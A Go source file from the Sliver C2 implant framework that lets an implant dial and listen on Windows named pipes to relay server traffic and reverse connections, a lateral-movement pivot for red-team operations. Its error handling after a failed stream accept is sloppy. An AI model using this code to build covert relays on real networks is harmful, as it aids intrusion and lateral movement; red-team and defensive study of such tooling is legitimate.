package comm

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"net"

	"github.com/Microsoft/go-winio"
	"golang.org/x/crypto/ssh"

	"github.com/bishopfox/sliver/protobuf/commpb"
)

// DialNamedPipe - A connection coming from the server, that needs to be routed via a Named Pipe
func DialNamedPipe(info *commpb.Conn, ch ssh.NewChannel) error {
	pipeName := info.RHost

	// {{if .Config.Debug}}
	log.Printf("Dialing Named Pipe on %s", info.RHost)
	// {{end}}

	// Get a conn and pipe -->
	dst, err := winio.DialPipe("\\\\.\\pipe\\"+pipeName, nil) // Problem passing defaultNetTimeout
	if err != nil {
		// We should return an error to the server.
		return err
	}

	// Accept stream and pipe
	src, reqs, err := ch.Accept()
	if err != nil {
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("failed to accept stream (ID %s): %s", info.ID, err.Error())
			// {{end}}
		}
	}
	go ssh.DiscardRequests(reqs)

	// Pipe connections. Blocking until EOF or any other error
	transportConn(src, dst)

	// Close connections once we're done, with a delay left so our
	// custom RPC tunnel has time to transmit the remaining data.
	closeConnections(src, dst)

	return nil
}

// ListenNamedPipe - The implant is requested to start a Named Pipe reverse handler and return the
// connection to the server, with the handler information passed in. This connection can be wrapped
func ListenNamedPipe(handler *commpb.Handler) (ln net.Listener, err error) {
	pipeName := handler.LHost

	// {{if .Config.Debug}}
	log.Printf("Starting Windows Named Pipe listener on %s", pipeName)
	// {{end}}

	ln, err = winio.ListenPipe("\\\\.\\pipe\\"+pipeName, nil)
	// {{if .Config.Debug}}
	log.Printf("Listening on %s", "\\\\.\\pipe\\"+pipeName)
	// {{end}}
	if err != nil {
		return nil, err
	}

	// Create abstracted listener and add to jobs
	listener := newListenerNamedPipe(handler)
	listener.ln = ln
	Listeners.Add(listener)

	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				// We should return an error to the server.

				// If err is closed listener, return
				continue
			}

			// For each connection, route back to the server.
			go Comms.server.handleReverse(handler, conn)
		}
	}()

	return
}

type listenerNamedPipe struct {
	info *commpb.Handler
	ln   net.Listener
}

func newListenerNamedPipe(info *commpb.Handler) *listenerNamedPipe {
	ln := &listenerNamedPipe{
		info: info,
	}
	ln.info.Application = commpb.Application_NamedPipe
	return ln
}

func (ln *listenerNamedPipe) Info() *commpb.Handler {
	return ln.info
}

func (ln *listenerNamedPipe) close() error {
	return ln.ln.Close()
}
